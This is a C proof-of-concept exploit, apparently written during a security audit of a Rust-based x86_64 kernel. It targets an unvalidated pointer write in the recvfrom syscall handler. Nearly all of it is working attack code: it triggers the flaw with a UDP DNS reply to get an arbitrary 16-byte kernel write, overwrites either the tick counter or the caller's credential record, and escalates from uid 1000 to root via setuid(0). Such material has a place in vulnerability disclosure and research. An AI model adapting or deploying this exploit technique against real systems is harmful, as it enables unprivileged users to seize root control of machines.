/* poc_recvfrom_write.c — F-x86a-1
 *
 * SYS_RECVFROM dispatch arm, src/arch/x86_64/linux/mod.rs (~lines 221-271):
 *
 *     let (n, src) = udp_recvfrom_fd(a[0], &mut buf)?;
 *     copy_out_pub(a[1], &buf[..n]);
 *     if a[4] != 0 && a[5] != 0 {
 *         match src.addr {
 *             V4(v4) => unsafe {
 *                 write_unaligned(a[4] as *mut [u8;16], sa);   // 16 bytes, NO validation
 *                 write_unaligned(a[5] as *mut u32, 16);       //  4 bytes, NO validation
 *             },
 *             ...
 *         }
 *     }
 *
 * a[4]/a[5] (src_addr / addrlen) are written through raw user pointers that
 * were never passed to check_user_ptr.  Any unprivileged process holding one
 * AF_INET+SOCK_DGRAM fd therefore gets:
 *   - a 16-byte kernel write  { u16 family=2, u16 src_port_be, u32 src_ip, 0*8 }
 *     at an attacker-chosen address (the last 8 bytes are always zero), and
 *   - a 4-byte kernel write of the constant 16 at a second chosen address.
 * Zeroing 8 bytes at euid/egid/suid/sgid of a Creds record is a straight
 * privesc (euid==0 => root under docs/security-model.md).
 *
 * This PoC proves the arbitrary write itself with a target whose value is
 * visible from ring3 without needing a heap address: the scheduler tick
 * counter (TICK_COUNT, exposed through clock_gettime(CLOCK_MONOTONIC)).  It
 * overwrites it with the sockaddr payload, so the monotonic clock jumps from
 * a few seconds to ~1e14 seconds.  -DRECV_CREDS_ADDR=<addr> switches the same
 * write to the caller's Creds record instead.
 *
 * Trigger: the only requirement is that one UDP datagram reaches the process.
 * The caller is a normal UDP client (DNS resolver shape): sends a query to
 * the QEMU slirp DNS server 10.0.2.3:53, whose reply is delivered back to the
 * socket's source port.  A host-side hostfwd packet to the guest's first
 * ephemeral UDP port (49152) is used as an independent fallback trigger.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#ifndef TICK_COUNT_ADDR
#error "TICK_COUNT_ADDR must be defined (from pagh.elf symbols)"
#endif

#ifndef SYS_socket
#define SYS_socket 41
#endif
#ifndef SYS_sendto
#define SYS_sendto 44
#endif
#ifndef SYS_recvfrom
#define SYS_recvfrom 45
#endif
#ifndef SYS_clock_gettime
#define SYS_clock_gettime 228
#endif
#ifndef SYS_setuid
#define SYS_setuid 105
#endif
#ifndef SYS_setgid
#define SYS_setgid 106
#endif

static long mono_sec(void) {
    struct timespec ts;
    memset(&ts, 0, sizeof ts);
    syscall(SYS_clock_gettime, 1 /* CLOCK_MONOTONIC */, &ts);
    return (long)ts.tv_sec;
}

int main(void) {
    syscall(SYS_setgid, 1000);
    syscall(SYS_setuid, 1000);
    printf("POC-RECVFROM: uid=%d euid=%d pid=%d\n", (int)getuid(), (int)geteuid(),
           (int)getpid());

    int fd = -1;
    for (int i = 0; i < 100; i++) {
        long r = syscall(SYS_socket, AF_INET, SOCK_DGRAM | 0x800 /*SOCK_NONBLOCK*/, 0);
        if (r >= 0) {
            fd = (int)r;
            break;
        }
        usleep(100000); /* NIC/DHCP may still be coming up */
    }
    printf("POC-RECVFROM: AF_INET/SOCK_DGRAM fd=%d errno=%d\n", fd, errno);
    fflush(stdout);
    if (fd < 0) {
        printf("POC-RECVFROM: no inet udp socket -> dispatch arm unreachable\n");
        return 1;
    }

    /* Minimal DNS query: id=0x1234, RD, one question "a" type A class IN. */
    unsigned char q[19] = {0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00,
                           0x00, 0x00, 0x01, 'a', 0x00, 0x00, 0x01, 0x00, 0x01};
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof dst);
    dst.sin_family = AF_INET;
    dst.sin_port = htons(53);
    dst.sin_addr.s_addr = inet_addr("10.0.2.3"); /* QEMU slirp built-in DNS */

    unsigned char rbuf[512];
    unsigned int harmless = 0; /* a[5]: the 4-byte constant write lands here */
#ifdef RECV_CREDS_ADDR
    unsigned long w16 = (unsigned long)RECV_CREDS_ADDR; /* 16-byte write target */
    printf("POC-RECVFROM: creds-write target=0x%lx\n", w16);
#else
    unsigned long w16 = (unsigned long)TICK_COUNT_ADDR; /* 16-byte write target */
    printf("POC-RECVFROM: TICK_COUNT target=0x%lx\n", w16);
#endif
    long before = mono_sec();
    printf("POC-RECVFROM: monotonic before=%ld\n", before);
    fflush(stdout);

    int got = 0;
    for (int i = 0; i < 300; i++) {
        /* Query the slirp DNS server; its reply comes back to our source port. */
        syscall(SYS_sendto, fd, q, sizeof q, 0, &dst, sizeof dst);
        long r = syscall(SYS_recvfrom, fd, rbuf, sizeof rbuf, 0, (void *)w16,
                         (void *)&harmless);
        if (r > 0) {
            got = (int)r;
            printf("POC-RECVFROM: datagram received (%d bytes) -> write executed\n", got);
            break;
        }
        usleep(50000);
    }
    if (!got) {
        printf("POC-RECVFROM: no datagram received in 15s (no peer); write not triggered\n");
        return 2;
    }
    fflush(stdout);

    long after = mono_sec();
    printf("POC-RECVFROM: monotonic after=%ld\n", after);
#ifdef RECV_CREDS_ADDR
    printf("POC-RECVFROM: now calling setuid(0)\n");
    long sr = syscall(SYS_setuid, 0);
    printf("POC-RECVFROM: setuid(0) -> %ld uid=%d euid=%d\n", sr, (int)getuid(),
           (int)geteuid());
    if (geteuid() == 0)
        printf("PWN-RECVFROM: kernel arbitrary write -> euid=0 (root)\n");
    else
        printf("POC-RECVFROM: creds write did not hit (euid=%d)\n", (int)geteuid());
#else
    if (after > 1000000L)
        printf("PWN-RECVFROM: arbitrary kernel write confirmed: MONOTONIC jumped %ld -> %ld\n",
               before, after);
    else
        printf("POC-RECVFROM: write did not change the tick counter (after=%ld)\n", after);
#endif
    fflush(stdout);
    return 0;
}